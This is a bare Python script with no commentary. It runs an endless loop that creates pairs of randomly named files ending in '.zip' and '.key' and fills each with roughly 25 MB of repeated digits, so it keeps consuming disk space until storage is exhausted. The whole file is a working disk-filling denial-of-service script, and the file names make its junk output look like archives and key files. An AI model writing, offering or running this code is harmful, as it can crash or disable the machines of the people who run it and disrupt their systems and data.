import random
def shuffle(string):
  tempList = list(string)
  random.shuffle(tempList)
  return ''.join(tempList)
while True:
    number1=''.join((random.choice('0123456789') for i in range(10)))
    number2=''.join((random.choice('0123456789') for i in range(10))) 
    number3=''.join((random.choice('0123456789') for i in range(10))) 
    number4=''.join((random.choice('0123456789') for i in range(10))) 
    number5=''.join((random.choice('0123456789') for i in range(10))) 
    number6=''.join((random.choice('0123456789') for i in range(10))) 
    number7=''.join((random.choice('0123456789') for i in range(10))) 
    number8=''.join((random.choice('0123456789') for i in range(10))) 
    number9=''.join((random.choice('0123456789') for i in range(10))) 
    number10=''.join((random.choice('0123456789') for i in range(10))) 
    number11=''.join((random.choice('0123456789') for i in range(10))) 
    number12=''.join((random.choice('0123456789') for i in range(10))) 
    number13=''.join((random.choice('0123456789') for i in range(10))) 
    number14=''.join((random.choice('0123456789') for i in range(10))) 
    number15=''.join((random.choice('0123456789') for i in range(10))) 
    number16=''.join((random.choice('0123456789') for i in range(10)))
    name = number1 + number2 + number3 + number4 + number5 + number6 + number7 + number8 + number9 + number10 + number11 + number12 + number13 + number14 + number15 + number16
    name = shuffle(name)
    hello = name + ".zip"
    helloo = name + ".key"
    write = name + name + name + name + name + name + name + name + name + name + name + name + name + name + name + name 
    print(name)
    f= open(hello,"w+")
    for i in range(10000):
        f.write(write)
    f= open(helloo,"w+")
    for i in range(10000):
        f.write(write)